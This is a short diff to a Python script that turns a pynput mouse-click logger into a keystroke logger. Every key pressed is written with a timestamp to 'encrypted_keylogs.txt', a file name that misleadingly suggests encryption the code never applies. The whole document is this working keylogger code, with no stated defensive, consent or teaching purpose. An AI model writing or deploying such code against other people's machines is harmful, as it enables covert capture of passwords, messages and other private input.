@@ -1,15 +1,11 @@
-from pynput import mouse
+from pynput import keyboard
 
-logging.basicConfig(filename="mouselogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+import logging
 
-def on_click(x, y, button, pressed):
-    try:
-        logging.info(f"{button} clicked at ({x}, {y})")
-    except Exception as e:
-        logging.error(f"Error logging click: {e}")
+logging.basicConfig(filename="encrypted_keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s", encoding="utf-8")
 
-listener = mouse.Listener(on_click=on_click)
-listener.start()
+def on_press(key):
+    logging.info(str(key))
 
-while True:
-    pass
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
